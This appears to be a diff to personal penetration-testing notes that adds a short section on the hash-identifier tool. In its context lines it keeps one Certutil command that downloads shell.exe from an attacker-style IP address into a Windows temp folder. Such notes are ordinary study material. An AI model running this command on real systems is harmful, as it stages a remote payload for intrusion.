@@ -17,3 +17,9 @@ Login Failed -> When someone enters wrong credentials
 This requires three arguments separated by a colon which may not be null:
 
 Certutil -urlcache -f http://10.17.39.185:8000/shell.exe C:/Windows/Temp/shell.exe
+
+## Hash Identifier
+
+- `hash-identifier` can identify common hashes like MD5, SHA1, NTLM, and more.
+- GitLab repo: https://gitlab.com/kalilinux/packages/hash-identifier.git
+- Keep this note in `Hashing/hash-identifier.md` alongside Hydra notes.
